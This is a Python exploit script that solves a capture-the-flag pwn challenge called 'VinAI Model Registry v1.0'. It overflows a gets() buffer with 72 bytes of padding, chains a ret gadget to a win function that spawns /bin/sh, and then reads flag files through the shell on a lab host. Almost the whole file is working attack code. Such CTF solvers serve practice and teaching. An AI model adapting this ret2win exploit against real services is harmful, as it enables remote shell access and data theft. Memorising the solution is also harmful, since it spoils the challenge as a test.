#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 3 (VinAI Model Registry v1.0)
Vulnerability: Buffer Overflow via gets() + ret2win (system('/bin/sh'))

Architecture: x86_64, No PIE (Base: 0x400000), No Canary
win function address: 0x4012b6 (calls system('/bin/sh'))
ret gadget (stack alignment): 0x401204
Offset to RIP: 64 bytes buffer + 8 bytes saved RBP = 72 bytes
"""
import socket
import struct
import time
import sys
import re

def solve(host='172.31.102.101', port=10003):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, int(port)))

    # Step 1: Read initial banner
    banner = s.recv(1024).decode(errors='ignore')
    print("[*] Banner:\n" + banner.strip())

    # Step 2: Send diagnostic string
    s.sendall(b'diag\n')
    time.sleep(0.2)
    s.recv(1024)

    # Step 3: Send ret2win payload
    # Buffer is 64 bytes at [rbp - 0x40]
    # Followed by 8 bytes saved RBP
    # Return address: ret gadget (for 16-byte stack alignment) + win function (0x4012b6)
    win_addr = 0x4012b6
    ret_gadget = 0x401204

    payload = b'A' * 64 + b'B' * 8 + struct.pack('<Q', ret_gadget) + struct.pack('<Q', win_addr) + b'\n'
    print(f"[*] Sending payload ({len(payload)} bytes)...")
    s.sendall(payload)

    time.sleep(0.5)
    resp = s.recv(4096).decode(errors='ignore')
    print("[*] Response:\n" + resp.strip())

    # Step 4: Retrieve flag via spawned shell
    print("[*] Fetching flag from shell...")
    s.sendall(b'cat flag* /flag* 2>/dev/null\n')
    time.sleep(1)
    shell_output = s.recv(4096).decode(errors='ignore')
    s.close()

    print("[*] Shell output:\n" + shell_output.strip())

    match = re.search(r'flag\{[^}]+\}', shell_output)
    if match:
        flag = match.group(0)
        print(f"\n[+] Flag found: {flag}")
        return flag
    else:
        print("[-] Flag not found in output.")
        return None

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.31.102.101'
    port = sys.argv[2] if len(sys.argv) > 2 else 10003
    solve(host, port)
